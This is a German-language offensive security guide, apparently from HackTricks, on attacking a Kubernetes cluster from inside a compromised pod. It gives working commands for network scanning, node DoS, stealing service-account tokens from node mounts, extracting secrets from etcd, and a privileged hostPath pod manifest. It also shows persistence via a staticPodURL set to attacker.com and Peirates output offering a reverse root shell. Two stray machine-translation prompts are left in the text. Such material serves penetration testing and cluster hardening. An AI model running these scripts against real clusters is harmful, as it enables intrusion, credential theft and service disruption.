# Angreifen von Kubernetes von innen in einem Pod

{{#include ../../banners/hacktricks-training.md}}

## **Pod-Ausbruch**

**Wenn Sie Glück haben, können Sie möglicherweise zum Knoten entkommen:**

![](https://sickrov.github.io/media/Screenshot-161.jpg)

### Ausbrechen aus dem Pod

Um zu versuchen, aus den Pods zu entkommen, müssen Sie möglicherweise zuerst **Berechtigungen eskalieren**, einige Techniken dafür:

{{#ref}}
https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html
{{#endref}}

Sie können diese **Docker-Ausbrüche überprüfen, um zu versuchen, aus einem Pod zu entkommen, den Sie kompromittiert haben:**

{{#ref}}
https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation/index.html
{{#endref}}

### Missbrauch von Kubernetes-Berechtigungen

Wie im Abschnitt über **Kubernetes-Enumeration** erklärt:

{{#ref}}
kubernetes-enumeration.md
{{#endref}}

In der Regel werden die Pods mit einem **Service-Account-Token** innerhalb von ihnen ausgeführt. Dieser Service-Account kann einige **Berechtigungen haben**, die Sie **ausnutzen** können, um zu anderen Pods zu **wechseln** oder sogar zu den Knoten, die im Cluster konfiguriert sind, zu **entkommen**. Überprüfen Sie, wie in:

{{#ref}}
abusing-roles-clusterroles-in-kubernetes/
{{#endref}}

### Missbrauch von Cloud-Berechtigungen

Wenn der Pod in einer **Cloud-Umgebung** ausgeführt wird, könnten Sie in der Lage sein, ein **Token vom Metadaten-Endpunkt zu leaken** und die Berechtigungen damit zu eskalieren.

## Suche nach anfälligen Netzwerkdiensten

Da Sie sich in der Kubernetes-Umgebung befinden, sollten Sie, wenn Sie die Berechtigungen der aktuellen Pods nicht ausnutzen und nicht aus dem Container entkommen können, **nach potenziell anfälligen Diensten suchen.**

### Dienste

**Zu diesem Zweck können Sie versuchen, alle Dienste der Kubernetes-Umgebung zu erhalten:**
```
kubectl get svc --all-namespaces
```
Standardmäßig verwendet Kubernetes ein flaches Netzwerk-Schema, was bedeutet, dass **jedes Pod/Dienst innerhalb des Clusters mit anderen kommunizieren kann**. Die **Namespaces** innerhalb des Clusters **haben standardmäßig keine Netzwerksicherheitsbeschränkungen**. Jeder im Namespace kann mit anderen Namespaces kommunizieren.

### Scannen

Das folgende Bash-Skript (entnommen aus einem [Kubernetes-Workshop](https://github.com/calinah/learn-by-hacking-kccn/blob/master/k8s_cheatsheet.md)) installiert und scannt die IP-Bereiche des Kubernetes-Clusters:
```bash
sudo apt-get update
sudo apt-get install nmap
nmap-kube ()
{
nmap --open -T4 -A -v -Pn -p 80,443,2379,8080,9090,9100,9093,4001,6782-6784,6443,8443,9099,10250,10255,10256 "${@}"
}

nmap-kube-discover () {
local LOCAL_RANGE=$(ip a | awk '/eth0$/{print $2}' | sed 's,[0-9][0-9]*/.*,*,');
local SERVER_RANGES=" ";
SERVER_RANGES+="10.0.0.1 ";
SERVER_RANGES+="10.0.1.* ";
SERVER_RANGES+="10.*.0-1.* ";
nmap-kube ${SERVER_RANGES} "${LOCAL_RANGE}"
}
nmap-kube-discover
```
Überprüfen Sie die folgende Seite, um zu erfahren, wie Sie **Kubernetes-spezifische Dienste** **angreifen** können, um **andere Pods/die gesamte Umgebung zu kompromittieren**:

{{#ref}}
pentesting-kubernetes-services/
{{#endref}}

### Sniffing

Falls der **kompromittierte Pod einen sensiblen Dienst ausführt**, bei dem sich andere Pods authentifizieren müssen, könnten Sie in der Lage sein, die Anmeldeinformationen, die von den anderen Pods gesendet werden, durch **Abhören lokaler Kommunikationen** zu erhalten.

## Netzwerk-Spoofing

Standardmäßig funktionieren Techniken wie **ARP-Spoofing** (und dank dessen **DNS-Spoofing**) im Kubernetes-Netzwerk. Dann, innerhalb eines Pods, wenn Sie die **NET_RAW-Fähigkeit** haben (die standardmäßig vorhanden ist), können Sie benutzerdefinierte Netzwerkpakete senden und **MitM-Angriffe über ARP-Spoofing auf alle Pods, die im selben Knoten laufen, durchführen.**\
Darüber hinaus, wenn der **bösartige Pod** im **gleichen Knoten wie der DNS-Server** läuft, können Sie einen **DNS-Spoofing-Angriff auf alle Pods im Cluster** durchführen.

{{#ref}}
kubernetes-network-attacks.md
{{#endref}}

## Node DoS

Es gibt keine Spezifikation von Ressourcen in den Kubernetes-Manifests und **keine angewendeten Limit**-Bereiche für die Container. Als Angreifer können wir **alle Ressourcen verbrauchen, in denen der Pod/Deployment läuft** und andere Ressourcen aushungern und einen DoS für die Umgebung verursachen.

Dies kann mit einem Tool wie [**stress-ng**](https://zoomadmin.com/HowToInstall/UbuntuPackage/stress-ng) durchgeführt werden:
```
stress-ng --vm 2 --vm-bytes 2G --timeout 30s
```
Sie können den Unterschied zwischen dem Ausführen von `stress-ng` und danach sehen.
```bash
kubectl --namespace big-monolith top pod hunger-check-deployment-xxxxxxxxxx-xxxxx
```
## Node Post-Exploitation

Wenn Sie es geschafft haben, **aus dem Container zu entkommen**, gibt es einige interessante Dinge, die Sie im Node finden werden:

- Der **Container Runtime** Prozess (Docker)
- Weitere **Pods/Container**, die im Node laufen und die Sie wie diesen missbrauchen können (mehr Tokens)
- Das gesamte **Dateisystem** und das **Betriebssystem** im Allgemeinen
- Der **Kube-Proxy** Dienst, der lauscht
- Der **Kubelet** Dienst, der lauscht. Überprüfen Sie die Konfigurationsdateien:
- Verzeichnis: `/var/lib/kubelet/`
- `/var/lib/kubelet/kubeconfig`
- `/var/lib/kubelet/kubelet.conf`
- `/var/lib/kubelet/config.yaml`
- `/var/lib/kubelet/kubeadm-flags.env`
- `/etc/kubernetes/kubelet-kubeconfig`
- Weitere **kubernetes gängige Dateien**:
- `$HOME/.kube/config` - **Benutzerkonfiguration**
- `/etc/kubernetes/kubelet.conf` - **Reguläre Konfiguration**
- `/etc/kubernetes/bootstrap-kubelet.conf` - **Bootstrap-Konfiguration**
- `/etc/kubernetes/manifests/etcd.yaml` - **etcd-Konfiguration**
- `/etc/kubernetes/pki` - **Kubernetes-Schlüssel**

### Finde node kubeconfig

Wenn Sie die kubeconfig-Datei in einem der zuvor kommentierten Pfade nicht finden können, **überprüfen Sie das Argument `--kubeconfig` des Kubelet-Prozesses**:
```
ps -ef | grep kubelet
root        1406       1  9 11:55 ?        00:34:57 kubelet --cloud-provider=aws --cni-bin-dir=/opt/cni/bin --cni-conf-dir=/etc/cni/net.d --config=/etc/kubernetes/kubelet-conf.json --exit-on-lock-contention --kubeconfig=/etc/kubernetes/kubelet-kubeconfig --lock-file=/var/run/lock/kubelet.lock --network-plugin=cni --container-runtime docker --node-labels=node.kubernetes.io/role=k8sworker --volume-plugin-dir=/var/lib/kubelet/volumeplugin --node-ip 10.1.1.1 --hostname-override ip-1-1-1-1.eu-west-2.compute.internal
```
### Geheimnisse stehlen
```bash
# Check Kubelet privileges
kubectl --kubeconfig /var/lib/kubelet/kubeconfig auth can-i create pod -n kube-system

# Steal the tokens from the pods running in the node
# The most interesting one is probably the one of kube-system
ALREADY="IinItialVaaluE"
for i in $(mount | sed -n '/secret/ s/^tmpfs on \(.*default.*\) type tmpfs.*$/\1\/namespace/p'); do
TOKEN=$(cat $(echo $i | sed 's/.namespace$/\/token/'))
if ! [ $(echo $TOKEN | grep -E $ALREADY) ]; then
ALREADY="$ALREADY|$TOKEN"
echo "Directory: $i"
echo "Namespace: $(cat $i)"
echo ""
echo $TOKEN
echo "================================================================================"
echo ""
fi
done
```
Das Skript [**can-they.sh**](https://github.com/BishopFox/badPods/blob/main/scripts/can-they.sh) wird automatisch **die Tokens anderer Pods abrufen und überprüfen, ob sie die Berechtigung** haben, nach der Sie suchen (anstatt dass Sie 1 für 1 suchen):
```bash
./can-they.sh -i "--list -n default"
./can-they.sh -i "list secrets -n kube-system"// Some code
```
### Privileged DaemonSets

Ein DaemonSet ist ein **pod**, der in **allen Knoten des Clusters** **ausgeführt** wird. Daher, wenn ein DaemonSet mit einem **privilegierten Dienstkonto** konfiguriert ist, wirst du in **ALLEN Knoten** das **Token** dieses **privilegierten Dienstkontos** finden, das du missbrauchen könntest.

Der Exploit ist derselbe wie im vorherigen Abschnitt, aber du bist jetzt nicht auf Glück angewiesen.

### Pivot to Cloud

Wenn der Cluster von einem Cloud-Dienst verwaltet wird, hat der **Node normalerweise einen anderen Zugriff auf den Metadaten**-Endpunkt als der Pod. Versuche daher, den **Metadaten-Endpunkt vom Knoten** (oder von einem Pod mit hostNetwork auf True) zu **zugreifen**:

{{#ref}}
kubernetes-pivoting-to-clouds.md
{{#endref}}

### Steal etcd

Wenn du den [**nodeName**](https://kubernetes.io/docs/tasks/configure-pod-container/assign-pods-nodes/#create-a-pod-that-gets-scheduled-to-specific-node) des Knotens angeben kannst, der den Container ausführen wird, erhalte eine Shell in einem Control-Plane-Knoten und hole die **etcd-Datenbank**:
```
kubectl get nodes
NAME                STATUS   ROLES    AGE   VERSION
k8s-control-plane   Ready    master   93d   v1.19.1
k8s-worker          Ready    <none>   93d   v1.19.1
```
control-plane-Knoten haben die **Rolle Master** und in **cloud-managed Clustern können Sie dort nichts ausführen**.

#### Geheimnisse aus etcd lesen 1

Wenn Sie Ihren Pod auf einem Control-Plane-Knoten mit dem `nodeName`-Selektor in der Pod-Spezifikation ausführen können, haben Sie möglicherweise einfachen Zugriff auf die `etcd`-Datenbank, die alle Konfigurationen für den Cluster, einschließlich aller Geheimnisse, enthält.

Unten finden Sie eine schnelle und schmutzige Möglichkeit, Geheimnisse aus `etcd` zu extrahieren, wenn es auf dem Control-Plane-Knoten läuft, auf dem Sie sich befinden. Wenn Sie eine elegantere Lösung wünschen, die einen Pod mit dem `etcd`-Client-Utility `etcdctl` startet und die Anmeldeinformationen des Control-Plane-Knotens verwendet, um sich mit etcd zu verbinden, wo auch immer es läuft, schauen Sie sich [dieses Beispiel-Manifest](https://github.com/mauilion/blackhat-2019/blob/master/etcd-attack/etcdclient.yaml) von @mauilion an.

**Überprüfen Sie, ob `etcd` auf dem Control-Plane-Knoten läuft und wo sich die Datenbank befindet (Dies ist in einem `kubeadm`-erstellten Cluster)**
```
root@k8s-control-plane:/var/lib/etcd/member/wal# ps -ef | grep etcd | sed s/\-\-/\\n/g | grep data-dir
```
Please provide the text you would like me to translate.
```bash
data-dir=/var/lib/etcd
```
**Daten in der etcd-Datenbank anzeigen:**
```bash
strings /var/lib/etcd/member/snap/db | less
```
**Extrahiere die Tokens aus der Datenbank und zeige den Namen des Dienstkontos an**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done
```
**Der gleiche Befehl, aber einige Greps, um nur das Standard-Token im kube-system-Namespace zurückzugeben**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done | grep kube-system | grep default
```
Please provide the text you would like me to translate.
```
1/registry/secrets/kube-system/default-token-d82kb | eyJhbGciOiJSUzI1NiIsImtpZCI6IkplRTc0X2ZP[REDACTED]
```
#### Secrets aus etcd 2 lesen [von hier](https://www.linkedin.com/posts/grahamhelton_want-to-hack-kubernetes-here-is-a-cheatsheet-activity-7241139106708164608-hLAC/?utm_source=share&utm_medium=member_android)

1. Erstellen Sie einen Snapshot der **`etcd`**-Datenbank. Überprüfen Sie [**dieses Skript**](https://gist.github.com/grahamhelton/0740e1fc168f241d1286744a61a1e160) für weitere Informationen.
2. Übertragen Sie den **`etcd`**-Snapshot auf Ihre bevorzugte Weise aus dem Knoten.
3. Entpacken Sie die Datenbank:
```bash
mkdir -p restore ; etcdutl snapshot restore etcd-loot-backup.db \ --data-dir ./restore
```
4. Start **`etcd`** auf Ihrem lokalen Rechner und lassen Sie es den gestohlenen Snapshot verwenden:
```bash
etcd \ --data-dir=./restore \ --initial-cluster=state=existing \ --snapshot='./etcd-loot-backup.db'

```
5. Liste alle Geheimnisse:
```bash
etcdctl get "" --prefix --keys-only | grep secret
```
6. Holen Sie sich die Geheimnisse:
```bash
etcdctl get /registry/secrets/default/my-secret
```
### Statische/Gespiegelte Pods Persistenz

_Statische Pods_ werden direkt vom kubelet-Daemon auf einem bestimmten Knoten verwaltet, ohne dass der API-Server sie beobachtet. Im Gegensatz zu Pods, die vom Control Plane verwaltet werden (zum Beispiel ein Deployment); stattdessen **beobachtet der kubelet jeden statischen Pod** (und startet ihn neu, wenn er fehlschlägt).

Daher sind statische Pods immer **an einen Kubelet** auf einem bestimmten Knoten gebunden.

Der **kubelet versucht automatisch, einen Spiegel-Pod auf dem Kubernetes API-Server** für jeden statischen Pod zu erstellen. Das bedeutet, dass die Pods, die auf einem Knoten ausgeführt werden, auf dem API-Server sichtbar sind, aber von dort aus nicht gesteuert werden können. Die Pod-Namen werden mit dem Hostnamen des Knotens und einem vorangestellten Bindestrich versehen.

> [!CAUTION]
> Die **`spec` eines statischen Pods kann nicht auf andere API-Objekte** verweisen (z. B. ServiceAccount, ConfigMap, Secret usw.). Daher **kannst du dieses Verhalten nicht ausnutzen, um einen Pod mit einem beliebigen ServiceAccount** im aktuellen Knoten zu starten, um den Cluster zu kompromittieren. Aber du könntest dies nutzen, um Pods in verschiedenen Namespaces auszuführen (falls das aus irgendeinem Grund nützlich ist).

Wenn du dich im Knotenhost befindest, kannst du ihn dazu bringen, einen **statischen Pod in sich selbst** zu erstellen. Das ist ziemlich nützlich, da es dir möglicherweise erlaubt, einen **Pod in einem anderen Namespace** wie **kube-system** zu erstellen.

Um einen statischen Pod zu erstellen, sind die [**Dokumente eine große Hilfe**](https://kubernetes.io/docs/tasks/configure-pod-container/static-pod/). Du benötigst im Grunde 2 Dinge:

- Konfiguriere den Parameter **`--pod-manifest-path=/etc/kubernetes/manifests`** im **kubelet-Dienst** oder in der **kubelet-Konfiguration** ([**staticPodPath**](https://kubernetes.io/docs/reference/config-api/kubelet-config.v1beta1/index.html#kubelet-config-k8s-io-v1beta1-KubeletConfiguration)) und starte den Dienst neu
- Erstelle die Definition in der **Pod-Definition** in **`/etc/kubernetes/manifests`**

**Eine andere, stealthy Methode wäre:**

- Ändere den Parameter **`staticPodURL`** in der **kubelet**-Konfigurationsdatei und setze etwas wie `staticPodURL: http://attacker.com:8765/pod.yaml`. Dies wird den kubelet-Prozess dazu bringen, einen **statischen Pod** zu erstellen, der die **Konfiguration von der angegebenen URL** abruft.

**Beispiel** für die **Pod**-Konfiguration, um einen privilegierten Pod in **kube-system** zu erstellen, entnommen von [**hier**](https://research.nccgroup.com/2020/02/12/command-and-kubectl-talk-follow-up/):
```yaml
apiVersion: v1
kind: Pod
metadata:
name: bad-priv2
namespace: kube-system
spec:
containers:
- name: bad
hostPID: true
image: gcr.io/shmoocon-talk-hacking/brick
stdin: true
tty: true
imagePullPolicy: IfNotPresent
volumeMounts:
- mountPath: /chroot
name: host
securityContext:
privileged: true
volumes:
- name: host
hostPath:
path: /
type: Directory
```
### Pods löschen + nicht planbare Knoten

Wenn ein Angreifer **einen Knoten kompromittiert hat** und er **Pods von anderen Knoten löschen** und **andere Knoten daran hindern kann, Pods auszuführen**, werden die Pods im kompromittierten Knoten neu gestartet und er wird in der Lage sein, die **Tokens**, die darin ausgeführt werden, zu **stehlen**.\
Für [**weitere Informationen folgen Sie diesen Links**](abusing-roles-clusterroles-in-kubernetes/index.html#delete-pods-+-unschedulable-nodes).

## Automatische Werkzeuge

- [**https://github.com/inguardians/peirates**](https://github.com/inguardians/peirates)
```
Peirates v1.1.8-beta by InGuardians
https://www.inguardians.com/peirates
----------------------------------------------------------------
[+] Service Account Loaded: Pod ns::dashboard-56755cd6c9-n8zt9
[+] Certificate Authority Certificate: true
[+] Kubernetes API Server: https://10.116.0.1:443
[+] Current hostname/pod name: dashboard-56755cd6c9-n8zt9
[+] Current namespace: prd
----------------------------------------------------------------
Namespaces, Service Accounts and Roles |
---------------------------------------+
[1] List, maintain, or switch service account contexts [sa-menu]  (try: listsa *, switchsa)
[2] List and/or change namespaces [ns-menu] (try: listns, switchns)
[3] Get list of pods in current namespace [list-pods]
[4] Get complete info on all pods (json) [dump-pod-info]
[5] Check all pods for volume mounts [find-volume-mounts]
[6] Enter AWS IAM credentials manually [enter-aws-credentials]
[7] Attempt to Assume a Different AWS Role [aws-assume-role]
[8] Deactivate assumed AWS role [aws-empty-assumed-role]
[9] Switch authentication contexts: certificate-based authentication (kubelet, kubeproxy, manually-entered) [cert-menu]
-------------------------+
Steal Service Accounts   |
-------------------------+
[10] List secrets in this namespace from API server [list-secrets]
[11] Get a service account token from a secret [secret-to-sa]
[12] Request IAM credentials from AWS Metadata API [get-aws-token] *
[13] Request IAM credentials from GCP Metadata API [get-gcp-token] *
[14] Request kube-env from GCP Metadata API [attack-kube-env-gcp]
[15] Pull Kubernetes service account tokens from kops' GCS bucket (Google Cloudonly) [attack-kops-gcs-1]  *
[16] Pull Kubernetes service account tokens from kops' S3 bucket (AWS only) [attack-kops-aws-1]
--------------------------------+
Interrogate/Abuse Cloud API's   |
--------------------------------+
[17] List AWS S3 Buckets accessible (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls]
[18] List contents of an AWS S3 Bucket (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls-objects]
-----------+
Compromise |
-----------+
[20] Gain a reverse rootshell on a node by launching a hostPath-mounting pod [attack-pod-hostpath-mount]
[21] Run command in one or all pods in this namespace via the API Server [exec-via-api]
[22] Run a token-dumping command in all pods via Kubelets (authorization permitting) [exec-via-kubelet]
-------------+
Node Attacks |
-------------+
[30] Steal secrets from the node filesystem [nodefs-steal-secrets]
-----------------+
Off-Menu         +
-----------------+
[90] Run a kubectl command using the current authorization context [kubectl [arguments]]
[] Run a kubectl command using EVERY authorization context until one works [kubectl-try-all [arguments]]
[91] Make an HTTP request (GET or POST) to a user-specified URL [curl]
[92] Deactivate "auth can-i" checking before attempting actions [set-auth-can-i]
[93] Run a simple all-ports TCP port scan against an IP address [tcpscan]
[94] Enumerate services via DNS [enumerate-dns] *
[]  Run a shell command [shell <command and arguments>]

[exit] Exit Peirates
```
- [**https://github.com/r0binak/MTKPI**](https://github.com/r0binak/MTKPI)

{{#include ../../banners/hacktricks-training.md}}
